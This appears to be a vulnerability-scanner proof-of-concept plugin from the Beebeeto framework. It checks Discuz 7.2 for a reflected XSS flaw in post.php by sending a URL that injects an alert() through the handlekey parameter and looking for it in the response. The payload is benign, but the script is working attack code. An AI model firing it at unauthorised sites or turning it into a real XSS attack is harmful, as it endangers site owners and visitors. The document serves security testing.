#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0009',
            'name': 'Discuz 7.2 /post.php 跨站脚本漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-09-19',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['7.2'],
            'type': 'Cross Site Scripting',
            'tag': ['Discuz!', 'post.php', 'Cross Site Scripting', 'XSS'],
            'desc': 'post.php中handlekey变量传入global.func.php后过滤不严,导致反射XSS漏洞的产生',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-065930',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = "/post.php?action=reply&fid=17&tid=1591&extra=&replysubmit=yes&infloat=yes&handlekey=,alert(/5294c4024a6f892da8a6af5abd1b3c36/)"
        keyword = "5294c4024a6f892da8a6af5abd1b3c36"
        vul_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
            print '[*] FileMD5 : ' + keyword
        request = urllib2.Request(vul_url)
        resp = urllib2.urlopen(request)
        content = resp.read()
        key = "if(typeof messagehandle_,alert(/"+keyword+"/)"
        if key in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            args['poc_ret']['payload'] = payload
            return args
        else:
            args['success'] = False
            return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
